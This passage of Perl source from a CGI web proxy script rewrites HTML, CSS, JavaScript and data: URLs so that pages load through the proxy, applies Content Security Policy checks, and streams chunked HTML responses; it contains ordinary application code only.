			if ($type || $default_script_type)=~
			    m#^(?:application/x-javascript|application/x-ecmascript|application/javascript|application/ecmascript|text/javascript|text/ecmascript|text/livescript|text/jscript)$#i ;
		}


	    } elsif ($tag_name eq 'style') {
		# Verify that $attr{type} is a valid MIME type.
		($attr{type})= $attr{type}=~ m#^\s*([\w.+\$-]*/[\w.+\$-]*)#, $rebuild=1
		    if  defined($attr{type}) && $attr{type}!~ m#^[\w.+\$-]+/[\w.+\$-]+$# ;





	    # These are seldom-used tags, or tags that seldom have URLs in them

	    } elsif ($tag_name eq 'select') {     # HTML 3.0
		$attr{src}=  &full_url($attr{src}),  $rebuild=1  if defined($attr{src}) ;

	    } elsif ($tag_name eq 'hr') {         # HTML 3.0
		$attr{src}=  &full_url($attr{src}),  $rebuild=1  if defined($attr{src}) ;

	    } elsif ($tag_name eq 'td') {         # Netscape extension?
		$attr{background}= &full_url($attr{background}), $rebuild=1 if defined($attr{background}) ;

	    } elsif ($tag_name eq 'th') {         # Netscape extension?
		$attr{background}= &full_url($attr{background}), $rebuild=1 if defined($attr{background}) ;

	    } elsif ($tag_name eq 'tr') {         # Netscape extension?
		$attr{background}= &full_url($attr{background}), $rebuild=1 if defined($attr{background}) ;

	    } elsif ($tag_name eq 'table') {      # Netscape extension?
		$attr{background}= &full_url($attr{background}), $rebuild=1 if defined($attr{background}) ;

	    } elsif ($tag_name eq 'bgsound') {    # Microsoft only
		$attr{src}=  &full_url($attr{src}),  $rebuild=1  if defined($attr{src}) ;

	    } elsif ($tag_name eq 'blockquote') {
		$attr{cite}= &full_url($attr{cite}), $rebuild=1  if defined($attr{cite}) ;

	    } elsif ($tag_name eq 'del') {
		$attr{cite}= &full_url($attr{cite}), $rebuild=1  if defined($attr{cite}) ;

	    } elsif ($tag_name eq 'embed') {      # Netscape only
		if ($attr{type}=~ /^$SCRIPT_TYPE_REGEX$/io) {
		    next if $scripts_are_banned_here
			    or !match_csp_source_list('script-src', $attr{src}) ;
		}
		next if !match_csp_source_list('object-src', $attr{src}) ;

		$attr{src}=  &full_url($attr{src}),  $rebuild=1  if defined($attr{src}) ;
		$attr{pluginspage}= &full_url($attr{pluginspage}),  $rebuild=1  if defined($attr{pluginspage}) ;

		$attr{flashvars}=  &proxify_flashvars($attr{flashvars}),  $rebuild=1  if defined($attr{flashvars}) ;

		if (defined($attr{data})) {
		    local($url_start)= url_start_by_flags($e_remove_cookies, $e_remove_scripts, $e_filter_ads,
							  $e_hide_referer, $e_insert_entry_form, 1, $attr{type}) ;
		    $attr{data}= &full_url($attr{data}) ;
		    $rebuild= 1 ;
		}

		# Proxifying SWF files relies on our JS library.
		$needs_jslib= 1 ;


	    } elsif ($tag_name eq 'fig') {        # HTML 3.0
		$attr{src}=      &full_url($attr{src}),      $rebuild=1  if defined($attr{src}) ;
		$attr{imagemap}= &full_url($attr{imagemap}), $rebuild=1  if defined($attr{imagemap}) ;

	    } elsif ($tag_name=~ /^h[1-6]$/) {    # HTML 3.0
		$attr{src}=  &full_url($attr{src}),  $rebuild=1  if defined($attr{src}) ;

	    } elsif ($tag_name eq 'ilayer') {
		$attr{src}=  &full_url($attr{src}),  $rebuild=1  if defined($attr{src}) ;

	    } elsif ($tag_name eq 'ins') {
		$attr{cite}= &full_url($attr{cite}), $rebuild=1  if defined($attr{cite}) ;

	    } elsif ($tag_name eq 'note') {       # HTML 3.0
		$attr{src}=  &full_url($attr{src}),  $rebuild=1  if defined($attr{src}) ;

	    } elsif ($tag_name eq 'overlay') {    # HTML 3.0
		$attr{src}=      &full_url($attr{src}),      $rebuild=1  if defined($attr{src}) ;
		$attr{imagemap}= &full_url($attr{imagemap}), $rebuild=1  if defined($attr{imagemap}) ;

	    } elsif ($tag_name eq 'q') {
		$attr{cite}= &full_url($attr{cite}), $rebuild=1  if defined($attr{cite}) ;

	    } elsif ($tag_name eq 'ul') {         # HTML 3.0
		$attr{src}=  &full_url($attr{src}),  $rebuild=1  if defined($attr{src}) ;

	    } elsif ($tag_name eq 'video') {      # HTML 5
		next if !match_csp_source_list('media-src', $attr{src}) ;
		$attr{src}=     &full_url($attr{src}),     $rebuild=1  if defined($attr{src}) ;
		$attr{poster}=  &full_url($attr{poster}),  $rebuild=1  if defined($attr{poster}) ;

	    } elsif ($tag_name eq 'audio') {      # HTML 5
		next if !match_csp_source_list('media-src', $attr{src}) ;
		$attr{src}=     &full_url($attr{src}),     $rebuild=1  if defined($attr{src}) ;

	    } elsif ($tag_name eq 'track') {      # HTML 5
		next if !match_csp_source_list('media-src', $attr{src}) ;
		$attr{src}=     &full_url($attr{src}),     $rebuild=1  if defined($attr{src}) ;

	    } elsif ($tag_name eq 'source') {     # HTML 5
		next if !match_csp_source_list('media-src', $attr{src}) ;
		$attr{src}=     &full_url($attr{src}),     $rebuild=1  if defined($attr{src}) ;



	    }   #####   END OF TAG-SPECIFIC PROCESSING   #####


	    if ($rebuild) {
		my($name, $value, $attrs, $end_slash) ;

		while (($name, $value)= each %attr) {
		    next unless defined($value) ;

		    # This makes strict XHTML fail, so let it fall through to
		    #   e.g. 'checked=""'; does that work for all cases?
		    #$attrs.= (' ' . $name), next   if $value eq '' ;

		    $value=~ s/&/&amp;/g ;
		    $value=~ s/([\x00-\x1f\x7f])/'&#' . ord($1) . ';'/ge ;
		    $value=~ s/</&lt;/g ;
		    $value=~ s/>/&gt;/g ;
		    if ($value!~ /"/ || $value=~ /'/) {
			$value=~ s/"/&quot;/g ;  # only needed when using double quotes
			$attrs.= join('', ' ', $name, '="', $value, '"') ;
		    } else {
			$attrs.= join('', ' ', $name, "='", $value, "'") ;
		    }
		}

		$end_slash= $tag=~ m#/\s*>?$#   ? ' /'   : '' ;
		$tag= "<$tag_name$attrs$end_slash>" ;
	    }

	    push(@out, $tag) ;


	} elsif ($comment) {

	    # Handle "conditional comments", which begin with "<!--&{" and
	    #   end with "};".  They evaluate the initial expression, and
	    #   depending on that, include or exclude the rest of the comment.
	    if ( $comment=~ /^<!--\s*&{/ ) {

		# Remove the whole conditional comment if scripts are banned.
		next if $scripts_are_banned_here ;  # remove it by not doing push(@out)

		# Otherwise, proxify conditional comments as configured.  Proxify
		#   the HTML content in any case, since it could get rendered.
		my($condition, $contents, $end)=
		    $comment=~ /^<!--\s*&{(.*?)}\s*;(.*?)(--\s*)?>$/s ;
		$condition= (&proxify_block($condition, $default_script_type))[0]
		    if $PROXIFY_SCRIPTS ;
		$contents=  &proxify_html(\$contents, 0, $no_exit_on_frameset) ;
		$comment= join('', '<!--&{', $condition, '};', $contents, $end, '>') ;


	    } elsif ( $comment=~ /^<!--\s*\[\s*if\b/i ) {

		# Proxify the contents of the comment.
		my($start, $contents, $end)=
		    $comment=~ /^(<!--[^>]*?>)(.*?)(<!\s*(?:\[\s*endif|--)[^>]*?>)$/is ;
		$contents=  &proxify_html(\$contents, 0, 1) ;
		$comment= "$start$contents$end" ;

	    } elsif ($PROXIFY_COMMENTS) {
		my($contents, $end)= $comment=~ /^<!--(.*?)(--\s*)?>$/s ;
		$contents=  &proxify_html(\$contents, 0, 1) ;
		$comment= "<!--$contents$end>" ;
	    }

	    push(@out, $comment) ;


	} elsif ($script_block) {
	    my($tag, $script, $attrs, %attr, $type, $language, $name, $remainder) ;

	    next if $scripts_are_banned_here ;

	    ($tag, $script)=
		$script_block=~ m#^(<\s*script\b[^>]*>)(.*)<\s*/script\b.*?>\z#si ;

	    $tag= &proxify_html(\$tag, 0) ;

	    ($attrs)= $tag=~ /^<\s*script\b([^>]*)>/i ;
	    while ($attrs=~ /([A-Za-z][\w.:-]*)\s*(?:=\s*(?:"([^">]*)"?|'([^'>]*)'?|([^'"][^\s>]*)))?/g ) {
		$name= lc($1) ;
		next if exists($attr{$name}) ;   # duplicate attr
		$attr{$name}= &HTMLunescape(defined($2) ? $2
					  : defined($3) ? $3
					  : defined($4) ? $4
					  : '' ) ;
	    }

	    next if $script=~ /\S/ and !match_csp_source_list('script-src', "'unsafe-inline'", $attr{nonce}) ;

	    $type= lc($attr{type}) ;
	    if (!$type && ($language= $attr{language})) {
		$type= $language=~ /javascript|ecmascript|livescript|jscript/i
						 ? 'application/x-javascript'
		     : $language=~ /css/i        ? 'text/css'
		     : $language=~ /vbscript/i   ? 'application/x-vbscript'
		     : $language=~ /perl/i       ? 'application/x-perlscript'
		     : $language=~ /tcl/i        ? 'text/tcl'
		     :                             ''
	    }
	    $type||= $default_script_type ;

	    if ($type=~ m#^(application/x-javascript|application/x-ecmascript|application/javascript|application/ecmascript|text/javascript|text/ecmascript|text/livescript|text/jscript)$#i) {
		my($new_script)= $script ;
		while ($PROXIFY_SCRIPTS) {
		    eval { $new_script= (&proxify_block($script, $type))[0] } ;
		    last unless $@ ;
		    if ($@ eq "end_of_input\n") {
			my($more)= $$body_ref=~ m#\G(.*?)<\s*/script\b.*?>#sgci ;
			$new_script= '', last unless $more ;
			$script.= "<\\/script>" . $more ;
		    } else {
			die $@ ;    # pass through any other error
		    }
		}
		$script= $new_script ;
	    }

	    push(@out, $tag, $script, '</script>') ;


	} elsif ($style_block) {
	    my($tag, $name, %attr, $attrs, $stylesheet, $type) ;

	    ($tag, $stylesheet)=
		$style_block=~ m#^(<\s*style\b[^>]*>)(.*?)<\s*/style\b.*?>#si ;

	    $tag= &proxify_html(\$tag, 0) ;
	    ($attrs)= $tag=~ /^<\s*style\b([^>]*)>/ ;
	    while ($attrs=~ /([A-Za-z][\w.:-]*)\s*(?:=\s*(?:"([^">]*)"?|'([^'>]*)'?|([^'"][^\s>]*)))?/g ) {
		$name= lc($1) ;
		next if exists($attr{$name}) ;   # duplicate attr
		$attr{$name}= &HTMLunescape(defined($2) ? $2
					  : defined($3) ? $3
					  : defined($4) ? $4
					  : '' ) ;
	    }

	    next if $stylesheet=~ /\S/ and !match_csp_source_list('style-src', "'unsafe-inline'", $attr{nonce}) ;

	    $type= lc($attr{type}) || $default_style_type ;

	    # Remove stylesheet if it's a script type and scripts are banned.
	    next if $scripts_are_banned_here && $type=~ /^$SCRIPT_TYPE_REGEX$/io ;

	    # Proxify the stylesheet.
	    $stylesheet= (&proxify_block($stylesheet, $type))[0] ;

	    push(@out, $tag, $stylesheet, '</style>') ;



	} elsif ($decl_bang) {
	    my($inside, @words, $q, $rebuild) ;
	    ($inside)= $decl_bang=~ /^<!([^>]*)/ ;
	    @words= $inside=~ /\s*("[^">]*"?|'[^'>]*'?|[^'"][^\s>]*)/g ;

	    foreach (@words) {
		# Don't hammer on W3C's poor servers.
		next if m#^['"]?http://www\.w3\.org/#i ;

		if (m#^["']?[\w+.-]+://#) {
		    if    (/^"/)  { $q= '"' ; s/^"|"$//g }
		    elsif (/^'/)  { $q= "'" ; s/^'|'$//g }
		    else          { $q= '' }

		    $_= $q . &HTMLescape(&full_url(&HTMLunescape($_))) . $q ;
		    $rebuild= 1 ;
		}
	    }

	    $decl_bang= '<!' . join(' ', @words) . '>'   if $rebuild ;

	    push(@out, $decl_bang) ;




	# Handle any <?...?> declarations, such as XML declarations.
	} elsif ($decl_question) {

	    # Nothing needs to be done to these.
	    push(@out, $decl_question) ;




	}  # end of main if comment/script/style/declaration/tag block


    }  # end of main while loop



    #   @out now has proxified HTML


    # Finally, a few things might be inserted into the page, if we're proxifying
    #   a full page and not just an HTML fragment.
    if ($is_full_page) {
	my($after_decl, $i) ;
	for ($i= 0; $i<@out; $i++) {
	    next unless $out[$i]=~ /^</ ;
	    $after_decl= $i+1, next if $out[$i]=~ /^<\s*(?:\?|!)/ ;
	    last ;   # if it's any other tag
	}


	splice(@out, ($body_pos || $html_pos || $after_decl), 0, $full_insertion)
	    if $doing_insert_here && $has_content ;

	my $head_insert_pos= $head_pos || $html_pos || $after_decl ;
	splice(@out, $head_insert_pos, 0, <<EOS) ;
<style>
div#_proxy_css_top_insertion label {float: none}
div#_proxy_css_top_insertion td {background: white; color: black}
div#_proxy_css_top_insertion input {padding: 5}
div#_proxy_css_top_insertion * {
  position: static;
  width: auto;
}
</style>
EOS

	if ($PROXIFY_SCRIPTS && $needs_jslib) {
	    my($jslib_block)= &js_insertion() ;
	    $head_insert_pos= $first_script_pos
		if defined($first_script_pos) && $first_script_pos<$head_insert_pos ;
	    splice(@out, $head_insert_pos, 0, $jslib_block) ;
	}
    }

    $url_start= $old_url_start  if $old_url_start ne '' ;

    return join('', @out) ;

}  # sub proxify_html()


sub proxify_html_part {
    my($body_ref)= @_ ;
    my(@out, $block) ;

    # We don't need to distinguish among block types in this simple routine.
    # We do need to exclude lone <script> and <style> tags from matching.
    # Note that the scheme for matching comments in proxify_html() won't work
    #   here, so we just end them on "-->".  Not perfect, but will only be
    #   used for those pages that require this routine.
    while ( $$body_ref=~ m{\G([^<]*
			      (?:<!--.*?--\s*>
				|<\s*script\b.*?<\s*/script\b.*?>
				|<\s*style\b.*?<\s*/style\b.*?>
				|<!(?!--)[^>]*>
				|<\?[^>]*>
				|<\s*(?!script\b|style\b|!)[^>]*>
			      )
			   )
			  }sgcix )
    {
	$block= $1 ;

	push(@out, &proxify_html(\$block)) ;
	push(@out, &js_insertion())          if $block=~ /^[^<]*<\s*head\b/i ;
	push(@out, &full_insertion($URL,0))  if $block=~ /^[^<]*<\s*body\b/i ;
    }

    return ( join('', @out), substr($$body_ref, pos($$body_ref)) ) ;
}


sub transmit_html_in_parts {
    my($status, $headers, $S)= @_ ;
    my($buf, $length, $numread, $thisread, $out, $in) ;

    print $STDOUT $status ;

    $headers=~ s/^(Content-Type:[^\015\012;]*)[^\015\012]*/$1; charset=UTF-8/gmi ;

    # Handle chunked response
    if ($headers=~ /^Transfer-Encoding:[ \t]*chunked\b/mi) {
	my($chunk_size, $chunk, $footers) ;

	print $STDOUT $headers ;

	while ($chunk_size= hex(<$S>) ) {
	    $chunk= &read_socket($S, $chunk_size) ;
	    return undef unless length($chunk) == $chunk_size ;
	    $_= <$S> ;         # clear CRLF after chunk

	    $meta_charset||= ($chunk=~ /^.{0,1024}?<\s*meta[^>]+\bcharset\s*=['"]?([^'"\s>]+)/si)[0] ;  # imperfect
	    eval { $buf.= decode($charset || $meta_charset || 'ISO-8859-1', $chunk) } ;
	    &malformed_unicode_die($charset || $meta_charset || 'ISO-8859-1') if $@ ;

	    ($out, $buf)= &proxify_html_part(\$buf) ;

	    eval { $out= encode('UTF-8', $out) } ;
	    &malformed_unicode_die('UTF-8') if $@ ;
	    print $STDOUT sprintf('%x', length($out)), "\015\012", $out, "\015\012"
		if $out ne '' ;
	}
	# Print any remaining buffer, and the end of the chunks.
	print $STDOUT sprintf('%x', length($buf)), "\015\012", $buf, "\015\012"
	    if $buf ne '' ;
	print $STDOUT "0\015\012" ;

	# After all chunks, read any footers, including the final blank line.
	while (<$S>) {
	    $footers.= $_ ;
	    last if /^(\015\012|\012)/  || $_ eq '' ;  # lines end w/ LF or CRLF
	}
	$footers=~ s/(\015\012|\012)[ \t]+/ /g ;       # unwrap long footer lines
	print $STDOUT $footers ;


    # Handle explicitly sized response.  Since we can't support
    #   the Content-Length: header, return chunked response.
    } elsif ($headers=~ /^Content-Length:[ \t]*(\d+)/mi) {
	$length= $1 ;

	# Change from specified-length to chunked encoding.
	$headers=~ s/^Content-Length:.*/Transfer-Encoding: chunked\015/mi ;

	print $STDOUT $headers ;

	# Read a block at a time, and write any available output as a chunk.
	while (    ($numread<$length)
		&& ($thisread= read($S, $in, $length-$numread) ) )
	{
	    return undef unless defined($thisread) ;
	    $numread+= $thisread ;

	    $meta_charset||= ($in=~ /^.{0,1024}?<\s*meta[^>]+\bcharset\s*=['"]?([^'"\s>]+)/si)[0] ;  # imperfect
	    eval { $buf.= decode($charset || $meta_charset || 'ISO-8859-1', $in) } ;
	    &malformed_unicode_die($charset || $meta_charset || 'ISO-8859-1') if $@ ;

	    ($out, $buf)= &proxify_html_part(\$buf) ;

	    eval { $out= encode('UTF-8', $out) } ;
	    &malformed_unicode_die('UTF-8') if $@ ;
	    print $STDOUT sprintf('%x', length($out)), "\015\012", $out, "\015\012"
		if $out ne '' ;
	}
	# Print any remaining buffer, and the end of the chunked response.
	print $STDOUT sprintf('%x', length($buf)), "\015\012", $buf, "\015\012"
	    if $buf ne '' ;
	print $STDOUT "0\015\012\015\012" ;   # no footers


    # Handle unsized response.
    } else {
	local($/)= '>' ;
	print $STDOUT $headers ;

	while (<$S>) {
	    last if $_ eq '' ;

	    $meta_charset||= (/^.{0,1024}?<\s*meta[^>]+\bcharset\s*=['"]?([^'"\s>]+)/si)[0] ;  # imperfect
	    eval { $buf.= decode($charset || $meta_charset || 'ISO-8859-1', $_) } ;
	    &malformed_unicode_die($charset || $meta_charset || 'ISO-8859-1') if $@ ;

	    ($out, $buf)= &proxify_html_part(\$buf) ;

	    eval { $out= encode('UTF-8', $out) } ;
	    &malformed_unicode_die('UTF-8') if $@ ;
	    print $STDOUT $out ;
	}
	return undef unless defined($thisread) ;
	print $STDOUT $buf ;
    }
}


sub full_url {
    my($uri_ref, $retain_query, $is_frame_src)= @_ ;

    # Disable $retain_query until potential anonymity issues are resolved.
    $retain_query= 0 ;

    $uri_ref=~ s/^\s+|\s+$//g ;  # remove leading/trailing whitespace

    return $uri_ref if $uri_ref=~ /^about:\s*blank$/i ;

    # For now, prevent redirecting into x-proxy URLs.
    return undef if $uri_ref=~ m#^x-proxy:#i ;

    # Handle "javascript:" URLs separately.  "livescript:" is an old synonym.
    if ($uri_ref=~ /^(?:javascript|livescript):/i) {
	return 'javascript: void 0'  if $scripts_are_banned_here 
				 or !match_csp_source_list('script-src', "'unsafe-inline'") ;
	return $uri_ref unless $PROXIFY_SCRIPTS ;
	my($script)= $uri_ref=~ /^(?:javascript|livescript):(.*)$/si ;
	my($rest, $last)= &separate_last_js_statement(\$script) ;
	$last=~ s/\s*;\s*$// ;
	$needs_jslib= 1 ;

	# If a frame's src attribute is a javascript: URL, then insert jslib HTML.
	# The jslib has to be run before the other statements.  Also, Chrome doesn't
	#   create an iframe's <body> element if the URL loads an external script,
	#   so we wrap the whole thing in a <body> element, which seems to make it work.
	if ($is_frame_src) {
	    my $js_insertion= &js_insertion() ;
	    $js_insertion=~ s/\n//g ;
	    $js_insertion=~ s/(['\\])/\\$1/g ;
	    my $rest_esc= (&proxify_js($rest, 0))[0] ;
	    $rest_esc=~ s/(['\\])/\\$1/g ;
	    my $last_esc= (&proxify_js($last, 0))[0] ;
	    $last_esc=~ s/(['\\])/\\$1/g ;
	    return "javascript: '<body>$js_insertion\n<script>$rest_esc; document.write(_proxy_jslib_proxify_html($last_esc)[0])</script></body>'" ;
	}

	return 'javascript:' . (&proxify_js($rest, 1))[0]
			     . '; _proxy_jslib_proxify_html(' . (&proxify_js($last, 0))[0] . ')[0]' ;
    }

    # Handle "data:" URIs specially.  They include a resource's entire data in a URL.
    if ($uri_ref=~ /^data:/i) {
	my($type, $clauses, $content)= $uri_ref=~ m#^data:([\w.+\$-]+/[\w.+\$-]+)?;?([^,]*),?(.*)#is ;
	$type= lc($type) ;
	if ($type eq 'text/html' or $type=~ /^$TYPES_TO_HANDLE_REGEX$/io) {
	    my($data_charset, $base64) ;
	    for (split(/;/, $clauses)) {
		$data_charset= $1, next  if /^charset=(\S+)/i ;
		$base64= 1  if lc eq 'base64' ;
	    }
	    if ($base64) {
		$content= unbase64($content) ;
	    } else {
		$content=~ s/%([\da-fA-F]{2})/ chr(hex($1)) /ge ;
	    }
	    if ($data_charset) {
		eval { $content= decode($data_charset, $content) } ;
		&malformed_unicode_die($data_charset) if $@ ;
	    }
	    $content= ($type eq 'text/html')  ? proxify_html($content)  : proxify_block($content, $type) ;
	    $content= encode($data_charset, $content) if $data_charset ;
	    $content= base64($content) ;
	    return $data_charset  ? "data:$type;charset=$data_charset;base64,$content"
				  : "data:$type;base64,$content" ;
	} else {
	    return $uri_ref ;
	}
    }

    # Separate fragment from URI
    my($uri, $frag)= $uri_ref=~ /^([^#]*)(#.*)?/ ;
    return $uri_ref if $uri eq '' ;  # allow bare fragments to pass unchanged

    # Hack here-- some sites (e.g. eBay) create erroneous URLs with linefeeds
    #   in them, which makes the links unusable if they are encoded here.
    #   So, here we strip CR and LF from $uri before proceeding.  :P
    $uri=~ s/[\015\012]//g ;

    # Sometimes needed for SWF apps; see comments above this routine.
    my($query) ;
    ($uri, $query)= split(/\?/, $uri)  if $retain_query ;
    $query= '?' . $query   if $query ;

    # Remove leading "." and ".." path segments from abs_path, or when there is
    #   no $base_path beyond "/"; this handles most cases where not reducing
    #   these causes problems.
    1 while $uri=~ s#^/\.\.?/#/# ;
    1 while (length($base_path)==length($base_host)+1) and $uri=~ s#\.\.?/## ;

    # calculate absolute URL based on five possible cases
    my($absurl)=
	    $uri=~ m#^[\w+.-]*:#i   ?  $uri                 # absolute URL
	  : $uri=~ m#^//#           ?  $base_scheme . $uri  # net_path (rare)
	  : $uri=~ m#^/#            ?  $base_host . $uri    # abs_path, rel URL
	  : $uri=~ m#^\?#           ?  $base_file . $uri    # abs_path, rel URL
	  :                            $base_path . $uri ;  # relative path

    return $url_start . &wrap_proxy_encode($absurl) . $query . $frag ;
}

sub full_url_by_frame {
    my($uri_ref, $is_frame)= @_ ;
    local($url_start)= $is_frame   ? $url_start_inframe  : $url_start_noframe ;
    return &full_url($uri_ref) ;
}
sub fix_base_vars {
    $base_url=~ s/\A\s+|\s+\Z//g ;  # remove leading/trailing spaces

    # Guarantee that $base_url has at least a path of '/', inserting before
    #   ?query if needed.
    $base_url=~ s#^([\w+.-]+://[^/?]+)/?#$1/# ;

    ($base_scheme)= $base_url=~ m#^([\w+.-]+:)//# ;
    ($base_host)=   $base_url=~ m#^([\w+.-]+://[^/?]+)# ; # no ending slash
    ($base_path)=   $base_url=~ m#^([^?]*/)# ;            # use greedy matching
    ($base_file)=   $base_url=~ m#^([^?]*)# ;
}

sub absolute_url {
    my($uri)= @_ ;
    return undef unless defined($uri) ;
    return  $uri=~ m#^[\w+.-]*:#i   ?  $uri                 # absolute URL
	  : $uri=~ m#^//#           ?  $base_scheme . $uri  # net_path (rare)
	  : $uri=~ m#^/#            ?  $base_host . $uri    # abs_path, rel URL
	  : $uri=~ m#^\?#           ?  $base_file . $uri    # abs_path, rel URL
	  :                            $base_path . $uri ;  # relative path
}

sub wrap_proxy_encode {
    my($URL)= @_ ;

    my($uri, $frag)= $URL=~ /^([^#]*)(.*)/ ;

    $uri= &proxy_encode($uri) ;

    # Encode ? so it doesn't prematurely end PATH_INFO.
    $uri=~ s/=/=3d/g ;
    $uri=~ s/\[/=5b/g ;
    $uri=~ s/\]/=5d/g ;
    $uri=~ s/\?/=3f/g ;
    $uri=~ s/%/=25/g ;
    $uri=~ s/&/=26/g ;
    $uri=~ s/;/=3b/g ;
    1 while $uri=~ s#//#/=2f#g ;    # work around Apache PATH_INFO bug

    return $uri . $frag ;
}


sub wrap_proxy_decode {
    my($enc_URL)= @_ ;

    my($uri, $query, $frag)= $enc_URL=~ /^([^?#]*)([^#]*)(.*)/ ;

    # First, un-encode =xx chars.
    $uri=~ s/=([0-9A-Fa-f]{2})/chr(hex($1))/ge ;

    $uri= &proxy_decode($uri) ;

    return $uri . $query . $frag ;
}


sub proxify_block {
    my($s, $type)= @_ ;

    if ($scripts_are_banned_here) {
	return undef if $type=~ /^$SCRIPT_TYPE_REGEX$/io ;
    }

    if ($type eq 'text/css') {

	$s=~ s/(\@font-face\s*\{([^}]*)\})|\burl\s*\(\s*(([^)]*\\\))*[^)]*)(\)|$)/
	       $1  ? '@font-face {' . proxify_font_face($2) . '}'
		   : (match_csp_source_list('img-src', $3)
		       && ('url(' . &css_full_url($3) . ')') )
	      /gie ;

	$s=~ s#\@import\s*("[^"]*"|'[^']*'|(?!url\s*\()[^;\s<]*)#
	       match_csp_source_list('style-src', $1)
	       && ('@import ' . &css_full_url($1))              #gie ;

	# image() is tricky.  It can contain a comma-separated list of declarations,
	#   each of which can be a quoted URL, or a color in string or xxx()
	#   functional notation, where xxx can be "rgb", "rgba", etc.
	# Perls before 5.10.0 can't use the (?PARNO) construct below, and the
	#   (??{}) construct is still experimental and inefficient.  Since
	#   parens here will only be nested once, the regex used below will work.
	# css_full_url_list() handles the related CSP.
	#$s=~ s/\bimage\s* ( \( (?:(?>[^()]+)|(?1))* \) ) /
	$s=~ s/\bimage\s* ( \( (?:(?>[^()]+)|\([^)]*\))* \) ) /
	       'image(' . &css_full_url_list($1) . ')'   /giex ;

	# As part of our _proxy_css_main_div hack, rewrite "body>foo" to be
	#   "div#_proxy_css_main_div>foo".  This hack is getting messier, and
	#   is imperfect... we really should do this for "body foo" (descendents)
	#   too, but that would require more complete CSS parsing... maybe later.
	#   It's not a privacy hole, it just affects display.
	$s=~ s/\bbody\s*>/div#_proxy_css_main_div>/gi ;

	# Proxify any strings inside "expression()" or "function()".
	# proxify_expressions_in_css() handles the related CSP.
	$s= &proxify_expressions_in_css($s)
	    if $s=~ /\b(?:expression|function)\s*\(/i ;

	return ($s, '') ;

    } elsif ($type=~ m#^(application/x-javascript|application/x-ecmascript|application/javascript|application/ecmascript|text/javascript|text/ecmascript|text/livescript|text/jscript)$#i) {

	# Slight hack-- verify $PROXIFY_SCRIPTS is true, since this may be
	#   called even when it's not true (e.g. style sheets of script type).
	return ($s, '') unless $PROXIFY_SCRIPTS ;

	return &proxify_js($s, 1) ;   # ... which returns two values


    # Handle ShockWave Flash resources.
    } elsif ($type eq 'application/x-shockwave-flash') {

	return (&proxify_swf($s), '') if $PROXIFY_SWF ;

	# Remove if not $ALLOW_UNPROXIFIED_SCRIPTS .
	return ($s, '') if $ALLOW_UNPROXIFIED_SCRIPTS ;

	return ('', '') ;


    # For any non-supported script type, either remove it or pass it unchanged.
    } elsif ($type=~ /^$SCRIPT_TYPE_REGEX$/io) {
	return $ALLOW_UNPROXIFIED_SCRIPTS  ? ($s, '')  : ('', '') ;


    } else {

	return ($s, '') ;

    }

}

sub css_full_url {
    my($url)= @_ ;
    my($q) ;

    $url=~ s/\s+$// ;       # leading spaces already stripped above
    if    ($url=~ /^"/)  { $q= '"' ; $url=~ s/^"|"$//g }  # strip quotes
    elsif ($url=~ /^'/)  { $q= "'" ; $url=~ s/^'|'$//g }
    $url=~ s/\\(.)/$1/g ;   # "\"-unescape
    $url=~ s/^\s+|\s+$//g ; # finally, strip spaces once more

    $url= &full_url($url) ;

    $url=~ s/([(),\s'"\\])/\\$1/g ;    # put "\"-escaping back in

    return $q . $url . $q ;
}


sub css_full_url_list {
    my($list)= @_ ;
    my($item, @out) ;

    $list=~ s/^\(|\)$//g ;
    # Extract quoted URIs, literal strings, or rgb() etc. functions.
    while ($list=~ /\G\s*("[^"]*"|'[^']*'|#?\w+(?:\(.*?\))?)\s*,?/gc) {
	my $item= $1 ;
	if ($item=~ s/^(['"])(.*)\1$/$2/gs) {
	    my $q= $1 ;
	    next unless match_csp_source_list('img-src', $item) ;
	    push(@out, $q . full_url($item) . $q) ;
	} else {
	    push(@out, $item) ;
	}
    }
    return join(',', @out) ;
}


# The @font-face rule in CSS can include "url(...)" within it.
# jsm-- this doesn't allow quotes in url()....
sub proxify_font_face {
    my($css)= @_ ;
    $css=~ s/\burl\s*\(\s*(([^)]*\\\))*[^)]*)(\)|$)/
	     match_csp_source_list('font-src', $1)
	     and ('url(' . &css_full_url($1) . ')')
	    /gie ;
    return $css ;
}


sub proxify_expressions_in_css {
    my($s)= @_ ;
    my(@out, $obeys_csp) ;

    while ($s=~ /(\G.*?(?:expression|function)\s*\()/gcis) {
	$obeys_csp||=    match_csp_source_list('script-src', "'unsafe-inline'")
		      && match_csp_source_list('style-src', "'unsafe-inline'") ;
	push(@out, $1) ;
	my $next_expr= &get_next_js_expr(\$s, 1) ;
	push(@out, (&proxify_js($next_expr))[0]) if $obeys_csp ;
	return undef unless $s=~ /\G\)/gc ;
	push(@out, ')') ;
    }
    return join('', @out, substr($s, pos($s))) ;
}


sub proxify_flashvars {
    my($fv)= @_ ;
    return $fv unless $fv ne '' ;
    my %fv= getformvars($fv) ;
    my $rebuild ;

    $fv{src}=    full_url($fv{src}), $rebuild= 1     if defined $fv{src} ;
    $fv{poster}= full_url($fv{poster}), $rebuild= 1  if defined $fv{poster} ;

    return $fv unless $rebuild ;

    my($name, $value, @ret) ;
    while (($name, $value)= each %fv) {
	$name=~  s/(\W)/ '%' . sprintf('%02x',ord($1)) /ge ;
	$value=~ s/(\W)/ '%' . sprintf('%02x',ord($1)) /ge ;
	push(@ret, "$name=$value") ;
    }
    return join('&', @ret) ;   # should use ";" but not all apps read that correctly
}


sub http_get {
    my($default_port, $portst, $realhost, $realport, $request_uri,
       $use_range, $dont_use_range, $realm, $tried_realm, $auth,
       $proxy_auth_header, $content_type,
       $lefttoget, $postblock, @postbody, $body_too_big, $rin,
       $status_code, $footers, $doing_cors_preflight_request, $cors_preflight_done) ;
    local($/)= "\012" ;

    # Localize filehandles-- safer for when using mod_perl, early exits, etc.
    # But unfortunately, it doesn't work well with tied variables.  :(
    local(*S, *S_PLAIN) ;

    # If using SSL, then verify that we're set up for it.
    if ($scheme eq 'https') {
	eval { require Net::SSLeay } ;  # don't check during compilation
	&no_SSL_warning($URL) if $@ ;

	&insecure_die  if !$RUNNING_ON_SSL_SERVER && !$OVERRIDE_SECURITY ;
    }


    $default_port= $scheme eq 'https'  ? 443  : 80 ;

    $port= $default_port if $port eq '' ;

    # Some servers don't like default port in a Host: header, so use $portst.
    $portst= ($port==$default_port)  ? ''  : ":$port" ;

    $realhost= $host ;
    $realport= $port ;
    $request_uri= $path ;
    $request_uri=~ s/ /%20/g ;    # URL-encode spaces for now; maybe more in the future
    my $hostst= $host=~ /:/  ? "[$host]"  : $host ;

    # there must be a smoother way to handle proxies....
    if ($scheme eq 'http' && $HTTP_PROXY) {
